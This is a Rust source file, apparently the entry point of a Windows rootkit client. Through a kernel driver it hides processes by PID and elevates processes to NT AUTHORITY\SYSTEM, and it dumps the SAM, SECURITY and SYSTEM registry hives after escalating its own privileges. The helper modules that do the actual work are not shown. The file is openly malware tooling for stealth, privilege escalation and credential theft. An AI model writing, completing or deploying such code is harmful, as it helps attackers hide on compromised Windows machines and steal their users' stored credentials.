use clap::{Parser, Subcommand};

mod constants;

mod kernel_interface;

use kernel_interface::{hide_process, contact_driver, elevate_process};
mod userland_process;
mod utils;

use userland_process::dump_creds;
use crate::utils::self_privesc;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {

    #[command(subcommand)]
    cmd: Commands,

}

#[derive(Subcommand, Debug, Clone)]
enum Commands {

    Hide {
        #[arg(short, long, help = "PID of the process to hide", required = true)]
        process: u32,
    },

    Privesc {
        #[arg(short, long, help = "PID of the process to elevate to NT AUTHORITY\\SYSTEM", required = true)]
        process: u32,
    },

    Creds {
        #[arg(short, long, help = "Path where the credential files will be dumped", required = true)]
        path: String,
    },

}

fn process_hide(pid: u32) {
    println!("Hiding process PID: {:?}", pid);
    unsafe {
        let driver_handle = contact_driver("\\\\.\\MyDevice");
        hide_process(driver_handle, pid);
    }
}

fn process_privesc(pid: u32) {
    println!("Elevate Process PID: {}", pid);
    unsafe {
        let driver_handle = contact_driver("\\\\.\\MyDevice");
        elevate_process(driver_handle, pid);
    }
}

fn process_creds(path: String) {
    println!("Dump SAM, SECURITY and SYSTEM in the path: {}", path);

    println!("Must be SYSTEM to dump creds. Attempting self privesc...");
    self_privesc();

    println!("Dumping creds...");
    dump_creds(path);

}

fn main() {
    let args = Args::parse();

    match args.cmd {

        Commands::Hide { process } => {
            process_hide(process);
        }

        Commands::Privesc { process } => {
            process_privesc(process);
        }

        Commands::Creds { path } => {
            process_creds(path);
        }


    }
}